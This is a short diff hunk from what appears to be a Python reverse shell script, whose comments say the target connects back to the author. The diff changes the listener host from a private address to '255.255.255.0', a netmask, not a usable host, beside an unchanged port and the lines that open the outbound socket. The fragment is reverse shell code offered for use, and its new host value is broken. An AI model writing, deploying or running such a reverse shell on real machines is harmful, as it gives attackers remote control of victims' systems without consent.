@@ -6,7 +6,7 @@ import subprocess
 # reverse shell, target connects to us
 # this connects to the server
 
-host = '192.168.84.20'
+host = '255.255.255.0' # IP address
 port = 9999 # don't choose a common one
 s = socket.socket()
 s.connect((host, port))
